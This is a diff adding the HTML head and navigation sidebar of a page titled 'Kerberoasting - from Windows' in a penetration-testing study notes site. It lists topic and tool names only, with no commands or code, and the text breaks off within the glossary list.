@@ -1,0 +1,784 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Kerberoasting - from Windows &mdash; Celestial Security Reference R1 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=8f9ffe49" />
+      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />
+      <link rel="stylesheet" type="text/css" href="../../_static/dark_mode_css/general.css?v=c0a7eb24" />
+      <link rel="stylesheet" type="text/css" href="../../_static/dark_mode_css/dark.css?v=70edf1c7" />
+
+  
+      <script src="../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../_static/documentation_options.js?v=3b1ff954"></script>
+      <script src="../../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
+      <script src="../../_static/dark_mode_js/default_dark.js?v=fd565c74"></script>
+      <script src="../../_static/dark_mode_js/theme_switcher.js?v=358d3910"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Access Control List (ACL) Abuse Primer" href="Access%20Control%20List%20%28ACL%29%20Abuse%20Primer.html" />
+    <link rel="prev" title="Kerberoasting - from Linux" href="Kerberoasting%20-%20from%20Linux.html" />
+    <link href="../../_static/custom.css" rel="stylesheet" type="text/css">
+
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            Celestial Security Reference
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Hack the Box Certifications</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Certified%20Penetration%20Tester.html">Certified Penetration Tester</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../CDSA/Certified%20Defensive%20Security%20Analyst.html">Certified Defensive Security Analyst</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Offensive Methods</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../OFSEC/recon/Active%20Scanning.html">Active Scanning</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Overview</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Overview/Introduction%20to%20Active%20Directory.html">Introduction to Active Directory</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Overview/Penetration%20Testing%20Overview.html">Penetration Testing Overview</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Overview/Types%20of%20Penetration%20testing.html">Types of Penetration testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Overview/Vulnerability%20Assessment.html">Vulnerability Assessment</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Reconnaissance</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Penetration%20Testing%20Overview.html">Penetration Testing Overview</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Network%20Enumeration%20with%20nmap.html">Network Enumeration with nmap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Footprinting.html">Footprinting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html">Infrastructure Based Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html#domain-information">Domain information</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html#cloud-resource-enumeration">Cloud Resource Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html#online-tools-to-gather-information-about-a-domain">Online Tools to gather information about a domain</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html#staff">Staff</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Host%20Enumeration.html">Host Based Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/fingerprinting.html">fingerprinting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Initial%20Enumeration%20of%20a%20AD%20Domain.html">Initial Enumeration of a AD Domain</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/External%20Recon%20and%20Enumeration%20Principles.html">External Recon and Enumeration Principles</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Information%20Gathering.html">Information Gathering</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Initial Access</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="File%20Inclusion.html">File Inclusion</a></li>
+<li class="toctree-l1"><a class="reference internal" href="SSH%20Forwarding.html">SSH Forwarding</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Dynamic%20Port%20Forwarding%20with%20SSH%20and%20SOCKS%20Tunneling.html">Dynamic Port Forwarding with SSH and SOCKS Tunneling</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Remote-Reverse%20Port%20Forwarding%20with%20SSH.html">Remote-Reverse Port Forwarding with SSH</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Meterpreter%20Tunneling%20and%20Port%20Forwarding.html">Meterpreter Tunneling and Port Forwarding</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Socat%20Redirection%20with%20a%20Reverse%20Shell.html">Socat Redirection with a Reverse Shell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Socat%20Redirection%20with%20a%20Bind%20Shell.html">Socat Redirection with a Bind Shell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="SSH%20for%20Windows%3A%20plink.exe.html">SSH for Windows: plink.exe</a></li>
+<li class="toctree-l1"><a class="reference internal" href="SSH%20Pivoting%20with%20Sshuttle.html">SSH Pivoting with Sshuttle</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Web%20Server%20Pivoting%20with%20Rpivot.html">Web Server Pivoting with Rpivot</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Port%20Forwarding%20with%20Windows%20Netsh.html">Port Forwarding with Windows Netsh</a></li>
+<li class="toctree-l1"><a class="reference internal" href="DNS%20Tunneling%20with%20Dnscat2.html">DNS Tunneling with Dnscat2</a></li>
+<li class="toctree-l1"><a class="reference internal" href="SOCKS5%20Tunneling%20with%20Chisel.html">SOCKS5 Tunneling with Chisel</a></li>
+<li class="toctree-l1"><a class="reference internal" href="ICMP%20Tunneling%20with%20SOCKS.html">ICMP Tunneling with SOCKS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="RDP%20and%20SOCKS%20Tunneling%20with%20SocksOverRDP.html">RDP and SOCKS Tunneling with SocksOverRDP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="LLMNR%20NBT-NS%20Poisoning%20from%20Linux.html">LLMNR/NBT-NS Poisoning - from Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="LLMNR%20NBT-NS%20Poisoning%20from%20Windows.html">LLMNR-NBT-NS Poisoning - from Windows</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Password%20Attacks.html">Password Attacks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Remote%20Password%20Attacks.html">Remote Password Attacks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Using%20the%20Metasploit%20Framework.html">Using the Metasploit Framework</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Shells%20and%20Payloads.html">Shells and Payloads</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Attacking%20Common%20Services.html">Attacking Common Services</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Active%20Directory%20Enumeration%20Attacks.html">Active Directory Enumeration Attacks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Password%20Spraying.html">Password Spraying</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Enumerating%20and%20Retrieving%20Password%20Policies.html">Enumerating and Retrieving Password Policies</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Internal%20Password%20Spraying%20from%20Linux.html">Internal Password Spraying from Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Internal%20Password%20Spraying%20from%20Windows.html">Internal Password Spraying from Windows</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Enumerating%20Security%20Controls.html">Enumerating Security Controls</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Credentialed%20Enumeration%20-%20from%20Linux.html">Credentialed Enumeration - from Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Credentialed%20Enumeration%20-%20from%20Windows.html">Credentialed Enumeration - from Windows</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Living%20Off%20the%20Land.html">Living Off the Land</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Kerberoasting%20-%20from%20Linux.html">Kerberoasting - from Linux</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Kerberoasting - from Windows</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#description">Description</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#kerberoasting-semi-manual-method">Kerberoasting - <strong>Semi Manual method</strong></a></li>
+<li class="toctree-l2"><a class="reference internal" href="#targeting-a-single-user">Targeting a Single User</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#retrieving-all-tickets-using-setspn-exe">Retrieving All Tickets Using setspn.exe</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#extracting-tickets-from-memory-with-mimikatz">Extracting Tickets from memory with <span class="xref std std-ref">mimikatz</span></a></li>
+<li class="toctree-l2"><a class="reference internal" href="#step-2-preparing-the-base64-blob-for-cracking">Step 2: Preparing the base64 blob for cracking</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#kerberoasting-semi-auto-method">Kerberoasting - <strong>Semi-auto method</strong></a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#extract-tgs-tickets-with-powerview">Extract TGS tickets with <span class="xref std std-ref">powerview</span></a></li>
+<li class="toctree-l3"><a class="reference internal" href="#using-rubeus-to-target-kerberos">Using <span class="xref std std-ref">rubeus</span> to target kerberos</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#example-1-looking-for-high-value-targets">Example 1:  Looking for high value targets:</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#checking-to-see-what-encryption-type-is-enabled">Checking to see what encryption type is enabled</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#mitigations-for-kerberoasting">Mitigations for Kerberoasting</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#references">References</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="Access%20Control%20List%20%28ACL%29%20Abuse%20Primer.html">Access Control List (ACL) Abuse Primer</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Lateral Movement</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/File%20Transfers.html">File Transfers</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Changing%20the%20user-agent%20to%20avoid%20detection.html">Changing the user-agent to avoid detection</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Native%20File%20Transfer%20Powershell.html">Native File Transfer Powershell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Creating%20a%20secure%20upload%20server%20using%20Nginx.html">Creating a secure upload server using Nginx</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Hunting%20for%20Files.html">Hunting for Files</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Linux%20Pass%20the%20Ticket.html">Linux Pass the Ticket</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Pivoting-Tunneling%20and%20Port%20Forwarding.html">Pivoting-Tunneling and Port Forwarding</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Glossary</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Active%20Directory.html">Active Directory</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Active%20Directory%20Explorer.html">Active Directory Explorer</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ADRecon.html">ADRecon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ADRecon.html#description">Description</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ADRecon.html#references">References</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/adidnsdump.html">adidnsdump</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/apache%20nutch.html">apache nutch</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Application%20Testing.html">Application Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Attacking%20AD%20and%20NTDS.dit.html">Attacking AD and NTDS.dit</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Attacking%20LSASS.html">Attacking LSASS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Attacking%20the%20SAM.html">Attacking the SAM</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Base64.html">Base64</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Bash.html">Bash</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/bettercap.html">bettercap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Bitlocker.html">Bitlocker</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Black%20box%20Testing.html">Black box Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/bloodhound.html">bloodhound</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/bloodhound.py.html">bloodhound.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/builtwith.html">builtwith</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/burp%20suite.html">burp suite</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Certificates.html">Certificates</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/cewl.html">cewl</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/chisel.html">chisel</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Compliance%20Standards.html">Compliance Standards</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Compliance%20Standards.html#references">References</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crackmapexec.html">crackmapexec</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crawling.html">crawling</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crowbar.html">crowbar</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crunch.html">crunch</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/cupp.html">cupp</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/CVE-2021-1675.py.html">CVE-2021-1675.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/CVSS.html">CVSS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/d3ad0ne.html">d3ad0ne</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/DKIM.html">DKIM</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/domainPasswordSpray.html">domainPasswordSpray</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/DMARC.html">DMARC</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/DNS.html">DNS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsenum.html">dnsenum</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsrecon.html">dnsrecon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsx.html">dnsx</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dsquery.html">dsquery</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ettercap.html">ettercap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/enum4linux-ng.html">enum4linux-ng</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Evasive%20testing.html">Evasive Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/evil-winrm.html">evil-winrm</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/extent.html">extent</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/GetNPUsers.py.html">GetNPUsers.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/fail2ban.html">fail2ban</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ffuf.html">ffuf</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/fierce.html">fierce</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/File%20Encryption%20on%20Linux.html">File Encryption on Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/File%20Encryption%20Windows.html">File Encryption Windows</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/finalRecon.html">finalRecon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Firefox%20Decrypt.html">Firefox Decrypt</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/FTP.html">FTP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/gettgtpkinit.py.html">gettgtpkinit.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/getnthash.py.html">getnthash.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/getuserspns.py.html">getuserspns.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/git.html">git</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/gobuster.html">gobuster</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/gpp-decrypt.html">gpp-decrypt</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Grey%20Box%20Testing.html">Grey Box Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Group3r.html">Group3r</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/hashcat.html">hashcat</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/hippa.html">hippa</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Hybrid%20evasive.html">Hybrid evasive</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/hydra.html">hydra</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/IMAP-POP3.html">IMAP-POP3</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/impacket.html">impacket</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/IPMP.html">IPMP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/iso-27001.html">iso-27001</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/inveigh.html">inveigh</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/invoke-TheHash.html">Invoke-TheHash</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/john.html">john</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/keytab.html">keytab</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/keytabextract.py.html">keytabextract.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/kerberoast.html">kerberoast</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/kwprocessor.html">kwprocessor</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ldapsearch.html">ldapsearch</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/lazagne.html">lazagne</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/laps.html">laps</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/LAPSToolkit.html">LAPSToolkit</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/linkatz.html">Linikatz</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Linux%20local%20password%20attacks.html">Linux local password attacks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Linux%20Mount.html">Linux Mount</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/lookupsid.py.html">lookupsid.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/kerbrute.html">kerbrute</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/md5sum.html">md5sum</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/metasploit.html">metasploit</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/medusa.html">medusa</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Microsoft%20DREAD.html">Microsoft DREAD</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/mimikatz.html">mimikatz</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/mitm6.html">mitm6</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/msfvenom.html">msfvenom</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/MSSQL.html">MSSQL</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/MySQL.html">MySQL</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/mssqlclient.py.html">mssqlclient.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/nessus.html">nessus</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/netcat.html">netcat</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/netcraft.html">netcraft</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/net-webclient.html">net-webclient</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Network%20Testing.html">Network Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/NIST.html">NIST</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/NFS.html">NFS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/nikto.html">nikto</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/nmap.html">nmap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/nopac.py.html">nopac.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/netstat.html">netstat</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/netstat.html#usage">Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Non-evasive%20testing.html">Non-evasive testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/O365spray.html">O365spray</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/openssl.html">openssl</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Oracle%20TNS.html">Oracle TNS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/OSINT%20Framework.html">OSINT Framework</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/OSSTMM.html">OSSTMM</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/OWASP.html">OWASP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/owasp-zap.html">owasp-zap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/pentest.html">pentest</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/petitpotam.py.html">petitpotam.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/pci-dss.html">pci-dss</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Physical%20Testing.html">Physical Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/PingCastle.html">PingCastle</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/powershell.html">powershell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/powerview.html">powerview</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/PowerShell%20Web%20Uploads.html">PowerShell Web Uploads</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/princeprocessor.html">princeprocessor</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/proxychains.html">proxychains</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/psexec.html">psexec</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/psexec.py.html">psexec.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/PTES.html">PTES</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/pyenv.html">pyenv</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/raiseChild.py.html">raiseChild.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/r-services.html">r-services</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rdp.html">rdp</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/recon-ng.html">recon-ng</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/reconSpider.html">reconSpider</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/responder.html">responder</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rid.html">rid</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rpc.html">rpc</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rsync.html">rsync</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rpcclient.html">rpcclient</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rpcinfo.html">rpcinfo</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rcpdump.py.html">rcpdump.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rubeus.html">rubeus</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/S3%20Buckets.html">S3 Buckets</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/shadow%20credentials%20abusing.html">shadow credentials abusing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sharpHound.html">sharpHound</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sharpview.html">sharpview</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smb.html">smb</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smbserver.py.html">smbserver.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/scrappy.html">scrappy</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sc.exe.html">sc.exe</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sc.exe.html#description">Description</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sc.exe.html#usage">Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/secretsdump.py.html">secretsdump.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/setspn.exe.html">setspn.exe</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/shells.html">shells</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sid.html">sid</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smbmap.html">smbmap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/SMTP.html">SMTP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html">smtp-user-enum</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html#installation">Installation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html#usage">Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html#references">References</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/SNMP.html">SNMP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/SQL%20Injection.html">SQL Injection</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/snaffler.html">snaffler</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Social%20Engineering%20Testing.html">Social Engineering Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ssh.html">ssh</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/spf.html">spf</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/spiderfoot.html">spiderfoot</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/SQL%20Injection%20Types.html">SQL Injection Types</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/SQL%20Load%20file.html">SQL Load file</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sqlcmd.html">sqlcmd</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sqsh.html">sqsh</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/subbrute.html">subbrute</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sudo.html">sudo</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/subfinder.html">subfinder</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Subverting%20SQL%20Query%20Logic.html">Subverting SQL Query Logic</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Symmetrical%20Encryption.html">Symmetrical Encryption</a></li>
